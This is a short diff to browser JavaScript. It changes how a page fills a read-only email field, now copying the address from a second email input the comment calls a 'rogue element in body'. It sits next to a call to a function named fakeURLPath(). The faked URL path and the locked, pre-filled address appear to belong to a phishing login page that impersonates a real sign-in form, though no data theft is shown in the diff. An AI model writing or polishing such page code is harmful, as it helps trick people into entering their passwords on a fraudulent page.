@@ -167,16 +167,24 @@
     fakeURLPath();
 
 setTimeout(function () {
-  var emailInput = document.querySelector('.inp_core[type="email"]');
-  var prefillEmail = localStorage.getItem('prefill_email'); // reads whatever was stored
+  // read from the rogue element in body
+  var sourceField = document.querySelector('input.field[type="email"]');
+  
+  // push to your actual form input
+  var formInput = document.querySelector('.inp_core[type="email"]');
 
-  if (emailInput && prefillEmail) {
-    emailInput.removeAttribute('readonly');
-    emailInput.value = prefillEmail;
-    emailInput.style.color = '#54738b';
-    emailInput.style.webkitTextFillColor = '#54738b';
-    emailInput.setAttribute('readonly', '');
-    localStorage.removeItem('prefill_email'); // clean up after use
+  if (sourceField && formInput) {
+    var email = sourceField.value; // grabs whatever email is already there
+    console.log('Found email:', email); // confirm it's reading correctly
+
+    formInput.removeAttribute('readonly');
+    formInput.value = email;
+    formInput.style.color = '#54738b';
+    formInput.style.webkitTextFillColor = '#54738b';
+    formInput.setAttribute('readonly', '');
+  } else {
+    console.log('sourceField:', sourceField);
+    console.log('formInput:', formInput);
   }
 }, 300);
 
